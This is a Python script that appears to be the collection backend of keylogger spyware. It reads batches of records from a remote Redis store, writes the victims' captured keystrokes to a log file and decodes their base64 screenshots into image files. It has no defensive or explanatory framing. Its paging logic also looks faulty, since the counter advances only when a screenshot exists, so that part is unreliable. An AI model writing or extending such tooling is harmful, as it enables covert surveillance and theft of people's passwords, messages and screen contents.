import redis
import base64
import json
import os
from dotenv import load_dotenv

# Load environment variables from .env file
load_dotenv()

# Connect to Redis database using upstash
redis_host = os.environ['REDIS_HOST']
redis_port = os.environ['REDIS_PORT']
redis_password = os.environ['REDIS_PASSWORD']
r = redis.Redis(host=redis_host, port=redis_port, password=redis_password, ssl=True)

# set the batch size for fetching data
batch_size = 5

# fetch the data from Redis in batches
start = 0
while True:
    end = start + batch_size - 1
    data = r.lrange('data', start, end)

    # break out of loop if no data is returned
    if not data:
        break

    # loop through the data and extract the images
    for item in data:
        # decode the item from bytes to string
        item = item.decode('utf-8')

        # parse the JSON data
        data_dict = json.loads(item)

        # extract the keystrokes and save them in a log file
        keystrokes = data_dict['keystrokes']
        with open('keystrokes.log', 'a') as f:
            f.write(keystrokes + '\n')

        # extract the screenshot and save it as an image file
        screenshot = data_dict['screenshot']
        if screenshot:
            # decode the base64 encoded image data
            img_data = base64.b64decode(screenshot)

            # save the image in the current directory with a unique name
            img_name = f"screenshot_{start}.png"
            with open(img_name, 'wb') as f:
                f.write(img_data)

            start += 1

print("Success! Images and Text extracted in current directory")
